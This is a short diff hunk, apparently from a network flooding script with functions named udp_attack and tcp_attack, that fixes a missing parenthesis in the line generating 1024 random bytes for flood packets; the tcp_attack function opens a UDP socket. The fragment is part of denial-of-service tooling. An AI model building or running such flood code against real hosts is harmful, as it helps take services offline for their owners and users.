@@ -71,7 +71,7 @@ def udp_attack(ip, port, packet, duration, thread_count):
 def tcp_attack(ip, port, packet, duration, thread_count):
     timeout = time.time() + duration
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(1024
+    data = random._urandom(1024)
 
     while time.time() < timeout:
         try:
